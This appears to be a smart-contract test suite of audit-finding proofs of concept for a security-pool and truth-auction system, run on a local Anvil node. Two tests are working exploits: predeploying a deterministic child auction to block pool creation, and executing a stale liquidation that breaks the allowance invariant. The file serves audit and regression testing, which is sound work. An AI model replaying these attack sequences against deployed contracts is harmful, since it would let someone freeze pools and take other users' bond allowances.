import { beforeAll, beforeEach, describe, setDefaultTimeout, test } from 'bun:test'
import assert from 'node:assert/strict'
import { encodeAbiParameters, keccak256, zeroAddress } from 'viem'
import { DAY, GENESIS_REPUTATION_TOKEN, TEST_ADDRESSES } from '../testsuite/simulator/utils/constants'
import { TEST_TIMEOUT_MS, useIsolatedAnvilNode } from '../testsuite/simulator/useIsolatedAnvilNode'
import { addressString } from '../testsuite/simulator/utils/bigint'
import { createWriteClient, type WriteClient, writeContractAndWait } from '../testsuite/simulator/utils/viem'
import { approveToken, getChildUniverseId, getETHBalance, setupTestAccounts } from '../testsuite/simulator/utils/utilities'
import { createQuestion, getQuestionId } from '../testsuite/simulator/utils/contracts/zoltarQuestionData'
import { deployOriginSecurityPool, ensureInfraDeployed, getInfraContractAddresses, getSecurityPoolAddresses } from '../testsuite/simulator/utils/contracts/deployPeripherals'
import { ensureZoltarDeployed, forkUniverse, getTotalTheoreticalSupply, getZoltarAddress } from '../testsuite/simulator/utils/contracts/zoltar'
import { approveAndDepositRep, handleOracleReporting, manipulatePriceOracleAndPerformOperation, triggerOwnGameFork } from '../testsuite/simulator/utils/contracts/peripheralsTestUtils'
import { createChildUniverse, finalizeTruthAuction, getSecurityPoolForkerForkData, initiateSecurityPoolFork, migrateRepToZoltar, migrateVault, startTruthAuction } from '../testsuite/simulator/utils/contracts/securityPoolForker'
import { createCompleteSet, depositRep, getCompleteSetCollateralAmount, getRepToken, getSecurityVault, getTotalSecurityBondAllowance } from '../testsuite/simulator/utils/contracts/securityPool'
import { getEthRaiseCap, OperationType, participateAuction, requestPriceIfNeededAndStageOperation } from '../testsuite/simulator/utils/contracts/peripherals'
import { QuestionOutcome } from '../testsuite/simulator/types/types'
import { peripherals_SecurityPoolOracleCoordinator_SecurityPoolOracleCoordinator, peripherals_factories_UniformPriceDualCapBatchAuctionFactory_UniformPriceDualCapBatchAuctionFactory } from '../types/contractArtifact'

setDefaultTimeout(TEST_TIMEOUT_MS)

const genesisUniverse = 0n
const securityMultiplier = 2n
const maxRetentionRate = 999_999_996_848_000_000n
const repDeposit = 1000n * 10n ** 18n
const outcomes = ['Yes', 'No']

describe('Audit finding PoCs', () => {
	const { getAnvilWindowEthereum, setBaselineSnapshot } = useIsolatedAnvilNode()
	let client: WriteClient
	let questionId: bigint
	let questionEndDate: bigint
	let questionData: {
		title: string
		description: string
		startTime: bigint
		endTime: bigint
		numTicks: bigint
		displayValueMin: bigint
		displayValueMax: bigint
		answerUnit: string
	}
	let securityPoolAddresses: {
		securityPool: `0x${string}`
		priceOracleManagerAndOperatorQueuer: `0x${string}`
		shareToken: `0x${string}`
		truthAuction: `0x${string}`
		escalationGame: `0x${string}`
	}

	const initializeBaseline = async () => {
		const mockWindow = getAnvilWindowEthereum()
		client = createWriteClient(mockWindow, TEST_ADDRESSES[0], 0)
		await setupTestAccounts(mockWindow)
		await ensureZoltarDeployed(client)
		await ensureInfraDeployed(client)

		const now = await mockWindow.getTime()
		questionEndDate = now + 365n * DAY
		questionData = {
			title: `audit-poc-${now}`,
			description: '',
			startTime: 0n,
			endTime: questionEndDate,
			numTicks: 0n,
			displayValueMin: 0n,
			displayValueMax: 0n,
			answerUnit: '',
		}
		questionId = getQuestionId(questionData, outcomes)
		await createQuestion(client, questionData, outcomes)
		await deployOriginSecurityPool(client, genesisUniverse, questionId, securityMultiplier, maxRetentionRate)
		await approveAndDepositRep(client, repDeposit, questionId)
		securityPoolAddresses = getSecurityPoolAddresses(zeroAddress, genesisUniverse, questionId, securityMultiplier)
	}

	beforeAll(async () => {
		await initializeBaseline()
		await setBaselineSnapshot()
	})

	beforeEach(() => {
		client = createWriteClient(getAnvilWindowEthereum(), TEST_ADDRESSES[0], 0)
	})

	const prepareOwnForkToYes = async () => {
		const mockWindow = getAnvilWindowEthereum()
		await mockWindow.setTime(questionEndDate + 10n * DAY)

		const repToken = await getRepToken(client, securityPoolAddresses.securityPool)
		const forkThreshold = (await getTotalTheoreticalSupply(client, repToken)) / 20n / securityMultiplier
		await depositRep(client, securityPoolAddresses.securityPool, 2n * forkThreshold)
		await triggerOwnGameFork(client, securityPoolAddresses.securityPool)
		await migrateRepToZoltar(client, securityPoolAddresses.securityPool, [QuestionOutcome.Yes])

		const yesUniverse = getChildUniverseId(genesisUniverse, QuestionOutcome.Yes)
		return {
			yesUniverse,
			yesChild: getSecurityPoolAddresses(securityPoolAddresses.securityPool, yesUniverse, questionId, securityMultiplier),
		}
	}

	const triggerExternalForkForSecurityPool = async () => {
		const mockWindow = getAnvilWindowEthereum()
		const forkingClient = createWriteClient(mockWindow, TEST_ADDRESSES[5], 0)
		const forkSourceQuestionData = {
			...questionData,
			title: `audit-poc-external-fork-${await mockWindow.getTime()}`,
			endTime: (await mockWindow.getTime()) + DAY,
		}
		const forkSourceQuestionId = getQuestionId(forkSourceQuestionData, outcomes)
		await createQuestion(forkingClient, forkSourceQuestionData, outcomes)
		await mockWindow.setTime(forkSourceQuestionData.endTime + 1n)
		await approveToken(forkingClient, addressString(GENESIS_REPUTATION_TOKEN), getZoltarAddress())
		await forkUniverse(forkingClient, genesisUniverse, forkSourceQuestionId)
		await initiateSecurityPoolFork(client, securityPoolAddresses.securityPool)
	}

	test('Resolved H-01 regression: funded truth auction proceeds are forwarded to the child pool', async () => {
		const mockWindow = getAnvilWindowEthereum()
		await mockWindow.setTime(questionEndDate + 10n * DAY)
		const forkThreshold = (await getTotalTheoreticalSupply(client, await getRepToken(client, securityPoolAddresses.securityPool))) / 20n
		await depositRep(client, securityPoolAddresses.securityPool, 2n * forkThreshold)
		const passiveRepHolder = createWriteClient(mockWindow, TEST_ADDRESSES[4], 0)
		await approveAndDepositRep(passiveRepHolder, 2n * forkThreshold, questionId)
		const securityPoolAllowance = repDeposit / 4n
		await manipulatePriceOracleAndPerformOperation(client, mockWindow, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, OperationType.SetSecurityBondsAllowance, client.account.address, securityPoolAllowance)
		const openInterestHolder = createWriteClient(mockWindow, TEST_ADDRESSES[1], 0)
		const openInterestAmount = 10n * 10n ** 18n
		await createCompleteSet(openInterestHolder, securityPoolAddresses.securityPool, openInterestAmount)

		await triggerExternalForkForSecurityPool()
		await migrateRepToZoltar(client, securityPoolAddresses.securityPool, [QuestionOutcome.Yes])
		const yesUniverse = getChildUniverseId(genesisUniverse, QuestionOutcome.Yes)
		const yesChild = getSecurityPoolAddresses(securityPoolAddresses.securityPool, yesUniverse, questionId, securityMultiplier)
		await migrateVault(client, securityPoolAddresses.securityPool, QuestionOutcome.Yes)
		await mockWindow.advanceTime(8n * 7n * DAY + DAY)
		await startTruthAuction(client, yesChild.securityPool)

		const ethRaiseCap = await getEthRaiseCap(client, yesChild.truthAuction)
		assert.ok(ethRaiseCap > 0n, 'test setup should require a funded truth auction')
		const repAtFork = (await getSecurityPoolForkerForkData(client, securityPoolAddresses.securityPool)).auctionableRepAtFork
		const auctionParticipant = createWriteClient(mockWindow, TEST_ADDRESSES[2], 0)
		await participateAuction(auctionParticipant, yesChild.truthAuction, repAtFork / 4n, ethRaiseCap)

		const forkerAddress = getInfraContractAddresses().securityPoolForker
		const forkerBalanceBefore = await getETHBalance(client, forkerAddress)
		const childBalanceBefore = await getETHBalance(client, yesChild.securityPool)
		await mockWindow.advanceTime(7n * DAY + DAY)
		await finalizeTruthAuction(client, yesChild.securityPool)
		const forkerBalanceAfter = await getETHBalance(client, forkerAddress)
		const childBalanceAfter = await getETHBalance(client, yesChild.securityPool)

		assert.equal(forkerBalanceAfter, forkerBalanceBefore, 'truth auction proceeds should not remain on the forker')
		assert.equal(childBalanceAfter - childBalanceBefore, ethRaiseCap, 'child pool balance should receive the auction proceeds')
		assert.equal(await getCompleteSetCollateralAmount(client, yesChild.securityPool), childBalanceBefore + ethRaiseCap, 'child collateral should include the auction proceeds')
	})

	test('H-02 PoC: predeploying the deterministic child truth auction blocks child pool creation', async () => {
		const { yesUniverse } = await prepareOwnForkToYes()
		const securityPoolSalt = keccak256(encodeAbiParameters([{ type: 'address' }, { type: 'uint248' }, { type: 'uint256' }, { type: 'uint256' }], [securityPoolAddresses.securityPool, yesUniverse, questionId, securityMultiplier]))

		await writeContractAndWait(client, () =>
			client.writeContract({
				abi: peripherals_factories_UniformPriceDualCapBatchAuctionFactory_UniformPriceDualCapBatchAuctionFactory.abi,
				address: getInfraContractAddresses().uniformPriceDualCapBatchAuctionFactory,
				functionName: 'deployUniformPriceDualCapBatchAuction',
				args: [getInfraContractAddresses().securityPoolForker, securityPoolSalt],
			}),
		)

		await assert.rejects(createChildUniverse(client, securityPoolAddresses.securityPool, QuestionOutcome.Yes), /error|revert|failed/i, 'predeploying the child auction should make legitimate child pool creation revert')
	})

	test('H-03 PoC: stale liquidation snapshot leaves local allowances above total allowance', async () => {
		const mockWindow = getAnvilWindowEthereum()
		await mockWindow.setTime(questionEndDate + 10n * DAY)
		const targetAllowance = repDeposit / 4n
		const forcedLiquidationPrice = 10n * 10n ** 18n
		await manipulatePriceOracleAndPerformOperation(client, mockWindow, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, OperationType.SetSecurityBondsAllowance, client.account.address, targetAllowance)

		const liquidator = createWriteClient(mockWindow, TEST_ADDRESSES[1], 0)
		await approveAndDepositRep(liquidator, repDeposit * 10n, questionId)
		await mockWindow.advanceTime(2n * 60n * 60n)

		await requestPriceIfNeededAndStageOperation(client, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, OperationType.WithdrawRep, client.account.address, 1n)
		await requestPriceIfNeededAndStageOperation(liquidator, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, OperationType.Liquidation, client.account.address, targetAllowance)
		const liquidationOperationId = await client.readContract({
			abi: peripherals_SecurityPoolOracleCoordinator_SecurityPoolOracleCoordinator.abi,
			address: securityPoolAddresses.priceOracleManagerAndOperatorQueuer,
			functionName: 'stagedOperationCounter',
			args: [],
		})

		await handleOracleReporting(client, mockWindow, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, forcedLiquidationPrice)
		await requestPriceIfNeededAndStageOperation(client, securityPoolAddresses.priceOracleManagerAndOperatorQueuer, OperationType.SetSecurityBondsAllowance, client.account.address, 0n)
		await writeContractAndWait(liquidator, () =>
			liquidator.writeContract({
				abi: peripherals_SecurityPoolOracleCoordinator_SecurityPoolOracleCoordinator.abi,
				address: securityPoolAddresses.priceOracleManagerAndOperatorQueuer,
				functionName: 'executeStagedOperation',
				args: [liquidationOperationId],
			}),
		)

		const targetVault = await getSecurityVault(client, securityPoolAddresses.securityPool, client.account.address)
		const liquidatorVault = await getSecurityVault(client, securityPoolAddresses.securityPool, liquidator.account.address)
		const totalAllowance = await getTotalSecurityBondAllowance(client, securityPoolAddresses.securityPool)

		assert.equal(targetVault.securityBondAllowance, 0n, 'target should have reduced live allowance to zero before stale liquidation executes')
		assert.equal(liquidatorVault.securityBondAllowance, targetAllowance, 'stale liquidation should add the old allowance to the liquidator')
		assert.equal(totalAllowance, 0n, 'global total allowance should remain reduced, proving the invariant break')
	})
})
